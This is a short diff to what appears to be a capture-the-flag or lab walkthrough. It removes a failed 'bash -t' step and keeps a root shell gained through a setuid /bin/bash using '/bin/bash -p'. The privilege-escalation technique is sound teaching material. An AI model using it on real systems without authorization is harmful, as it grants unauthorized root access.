@@ -401,9 +401,6 @@ After a few minutes, we can check the newly changed bash file, and become root:
 ```
 ls -al /bin/bash
 -rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
-bash -t
-whoami
-frank
 /bin/bash -p
 whoami
 root
